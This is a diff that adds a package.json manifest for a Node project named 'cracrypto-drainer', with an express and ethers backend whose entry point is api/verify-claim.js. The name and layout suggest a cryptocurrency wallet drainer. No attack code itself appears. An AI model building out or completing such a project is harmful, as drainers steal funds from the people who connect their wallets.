@@ -1,0 +1,16 @@
+{
+  "name": "cracrypto-drainer",
+  "version": "1.0.0",
+  "description": "CRAcrypto backend",
+  "main": "api/verify-claim.js",
+  "scripts": {
+    "start": "node api/verify-claim.js",
+    "dev":   "node api/verify-claim.js"
+  },
+  "dependencies": {
+    "axios":   "^1.6.0",
+    "dotenv":  "^16.3.1",
+    "ethers":  "^6.9.0",
+    "express": "^4.18.2"
+  }
+}
